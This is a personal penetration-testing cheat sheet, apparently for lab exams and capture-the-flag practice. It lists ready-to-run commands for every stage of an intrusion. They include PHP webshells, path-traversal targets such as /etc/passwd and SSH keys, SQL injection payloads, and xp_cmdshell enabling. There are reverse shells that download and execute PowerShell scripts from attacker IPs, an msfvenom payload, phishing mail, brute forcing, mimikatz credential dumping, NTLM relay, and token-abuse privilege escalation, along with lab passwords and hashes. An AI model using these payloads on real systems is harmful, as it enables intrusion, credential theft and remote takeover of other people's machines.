# My Cheet Sheet
- [My Cheet Sheet](#my-cheet-sheet)
- [Port Scan](#port-scan)
  - [rustscan](#rustscan)
  - [nmap](#nmap)
  - [Powershell](#powershell)
- [Recon](#recon)
  - [Autorecon](#autorecon)
  - [SNMP](#snmp)
  - [SMB](#smb)
  - [Web](#web)
    - [App](#app)
    - [subdomain](#subdomain)
    - [dir](#dir)
    - [endpoint](#endpoint)
- [Initial Access](#initial-access)
  - [Path Traversal](#path-traversal)
    - [LFI](#lfi)
  - [Webshell](#webshell)
  - [Reverse Shell](#reverse-shell)
    - [Bypass](#bypass)
  - [SQLi](#sqli)
    - [MSSQL](#mssql)
  - [ExploitDB](#exploitdb)
  - [shellcode](#shellcode)
- [Phishing](#phishing)
- [Foothold](#foothold)
  - [Interactiveshell](#interactiveshell)
  - [Windows](#windows-1)
    - [SHELL](#shell)
    - [Client Soft](#client-soft)
- [Credential Access](#credential-access)
  - [Brute Force](#brute-force)
  - [hashcrack](#hashcrack)
  - [Windows](#windows-2)
    - [mimikatz](#mimikatz)
- [Lateral Movement](#lateral-movement)
  - [NTLM Relay](#ntlm-relay)
- [Discovery](#discovery)
  - [Windows](#windows-3)
    - [PowerView](#powerview)
    - [winPEAS](#winpeas)
- [Privilege Escalation](#privilege-escalation)
  - [Windows](#windows-4)
    - [PowerUp](#powerup)
    - [LOLBIN](#lolbin)
    - [token](#token)
- [Tips](#tips)


# Port Scan
## rustscan
```bash
rustscan -a <IP> --top --ulimit 5000
```
## nmap
```bash
# IP-Sweep
nmap -sn -v 192.168.50.1-253 -oG ping-sweep.txt

# TCP
nmap -sT -n -Pn -v 192.168.50.1-254 -A
nmap -sT -n -Pn -v 192.168.50.1-254 --top-ports 1000 -A
# UDP
nmap -sU -n -Pn -v <IP>

# SMB
# help /usr/share/nmap/scripts
nmap -p 139,445 -n -Pn --script smb-protocols,smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-services 10.10.11.158
nmap -p 139,445 -n -Pn --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos,smb-vuln-webexec 10.10.10.40

# SMTP
nmap -p 25 --script smtp-commands,smtp-ntlm-info

# vuln
nmap -n -Pn --script vuln 10.10.10.248
```
## Powershell
```powershell
# on powershell
1..8000 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.221.151", $_)) "TCP port $_ is open"} 2>$null
```

# Recon
## Autorecon
```bash
source /opt/autorecon/bin/activate
autorecon <CIDR>
```

## SNMP
```bash
# https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py
python3 snmpbrute.py -t 10.10.11.193

# snmpwalk
snmpwalk -c internal -v2c 10.10.11.193 
```

## SMB
```bash
smbclient -N -L \\\\10.129.144.138
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```

## Web
### App
```bash
# nikto
nikto -p 80 -h http://

# whatweb
whatweb -v http://
```
### subdomain
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http:// -H "Host: FUZZ. " -mc all -fs 111
```
### dir
```bash
# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -e aspx,txt,pdf,html,php -u http:// 
ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -e aspx,txt,pdf,html,php -u http://

# dirsearch
dirsearch -u https://

# gobuster
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -k -x aspx,txt,pdf,html,php -u http://
gobuster dir -w /usr/share/wordlists/dirb/common.txt -k -x aspx,txt,pdf,html,php -u http://

# Dirb
dirb http://
```
### endpoint
```bash
# katana
katana -u http://
```

# Initial Access
https://github.com/swisskyrepo/PayloadsAllTheThings
## Path Traversal
```bash
/etc/passwd
/proc/self/cmdline
/proc/1/cwd
/proc/2/environ
/home/offsec/.ssh/id_rsa
/etc/nginx/nginx.conf
/etc/nginx/modules-enabled/default.conf
```
### LFI
```php
# page=...

php://filter/resource=admin.php
php://filter/convert.base64-encode/resource=admin.php

data://text/plain;base64,<base64>&cmd=ls
```
## Webshell
/usr/share/webshells
```php
<?php echo(system($_GET["cmd"])); ?>
<?php echo(shell_exec($_GET["cmd"])); ?>
<?php echo(exec($_GET["cmd"]));?>
```
## Reverse Shell
https://www.revshells.com/
<br/>
https://tex2e.github.io/reverse-shell-generator/index.html
### Bypass
```bash
w'h'o'am'i
w"h"o"am"i
```
#### Linux
```bash
# /
${PATH:0:1}
${PWD:0:1}
# white
${IFS}
$9
# ;
${LS_COLORS:10:1}
```
#### Windows
```powershell
# \
$env:HOMEPATH[0]

```
## SQLi
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
```bash
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //

# colum
' ORDER BY 1-- //
' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```
### MSSQL
https://book.hacktricks.xyz/v/jp/network-services-pentesting/pentesting-mssql-microsoft-sql-server
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202

# help
help

# xp_cmdshell
enable_xp_cmdshell

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';

# NTLM
responder -I tun0

xp_dirtree '\\10.10.14.23\any\thing'

SELECT name FROM master.dbo.sysdatabases;
USE master
exec master.dbo.xp_dirtree '\\10.10.14.23\relay'
EXEC master..xp_subdirs '\\10.10.14.23\anything\'
EXEC master..xp_fileexist '\\10.10.14.23\anything\'
```

## ExploitDB
```bash
searchsploit -m 42031
```
## shellcode
https://shell-storm.org/shellcode/index.html
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python 
```

# Phishing
webdav
```bash
# webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/work/webdav
# sendmail
swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.232.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap  
```
shellter
```bash
shellter
```

# Foothold
## Interactiveshell
```bash
# 仮想tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg 
export TERM=xterm-256col
export SHELL=/bin/bash
reset
```
## Windows
### SHELL
```powershell
#nc.exe
powershell -nop -c "iwr -Uri http://10.10.14.35/nc.exe -Outfile nc.exe"
.\nc.exe 10.10.14.35 4444 -e powershell

# Invoke-PowerShellTcp
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 4444"

# powercat
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.185/powercat.ps1');powercat -c 192.168.45.185 -p 4444 -e powershell"

# Unrestricted
powershell -ep bypass
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
```
### Client Soft
```bash
# SMB
impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
smbclient -U tyler \\\\test\\share

# psexec
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
# wmiexec
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
# evil-winrm
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```


# Credential Access
## Brute Force
```bash
# hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337" rdp://192.168.50.202
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed. Invalid"
```
## hashcrack
```bash
# MD5-RAW: 0, NTLM: 1000, NetNTLMv2: 5600, TGS-REP: 13100
hashcat -m 0 -a 0 crackme.txt /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/john/rules/best64.rule hash.txt
```
## Windows
### mimikatz
```powershell
# PTH
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
#PTT
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# lsadump
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:Administrator" "exit"
```

# Lateral Movement
## NTLM Relay 
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
```

# Discovery
## Windows
### PowerView
```powershell
cd /usr/share/windows-resources/powersploit/Recon/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
```
### winPEAS
```powershell
# on nc.exe
cd /usr/share/peass/winpeas
iwr -Uri http:// -Outfile winPEASany.exe
# on powershell
iwr -Uri http:// -Outfile winPEAS.bat
```

# Privilege Escalation
## Windows
### PowerUp
```powershell
cd /usr/share/windows-resources/powersploit/Privesc/
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')

# john Password123!

# Binary Hijacking
Get-ModifiableServiceFile
## AbuseFunction
Install-ServiceBinary -Name ''

# UnquotedService
Get-UnquotedService
## AbuseFunction  
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
### LOLBIN
```powershell
# Binary Hijacking
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\mysql\bin\mysqld.exe"
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
net stop mysql
shutdown /r /t 0 

# tasks
schtasks /query /fo LIST /v
Get-ScheduledTask
```

### token
```powershell
# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato
cd /usr/share/windows-resources/binaries/
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.83 9999 -e cmd"

# SharpToken
cd /usr/share/windows-resources/binaries/
.\SharpToken.exe list_token
.\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
.\SharpToken.exe add_user admin Abcd1234! Administrators
```



# Tips
```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```